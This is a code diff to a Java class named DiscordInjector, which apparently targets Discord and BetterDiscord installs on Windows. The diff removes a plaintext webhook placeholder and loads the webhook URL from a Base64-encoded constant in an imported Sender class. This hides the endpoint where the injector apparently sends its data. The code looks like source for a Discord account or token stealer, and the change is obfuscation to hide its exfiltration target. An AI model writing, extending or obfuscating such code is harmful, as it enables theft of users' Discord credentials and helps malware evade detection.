@@ -4,12 +4,12 @@ import java.awt.Desktop;
 import java.io.File;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
-import java.util.ArrayList;
-import java.util.List;
-import java.util.Objects;
-import java.util.Scanner;
+import java.util.*;
 
+import io.github.luxotick.Sender;
 import org.apache.commons.io.FileUtils;
+
+import static io.github.luxotick.Sender.a;
 
 public class DiscordInjector {
 
@@ -20,7 +20,9 @@ public class DiscordInjector {
 		discordPath = System.getenv("APPDATA") + "/Microsoft/Windows/Start Menu/Programs/Discord Inc";
 		betterPath = System.getenv("APPDATA") + "/BetterDiscord/data";
 		localPath = System.getenv("LOCALAPPDATA");
-		webhookURL = "webhookurl";
+		byte[] decodedBytes = Base64.getDecoder().decode(a);
+		String decodedStr = new String(decodedBytes);
+		webhookURL = decodedStr;
 	}
 	
 	private static Boolean killCheck, bettCheck, legitMode;
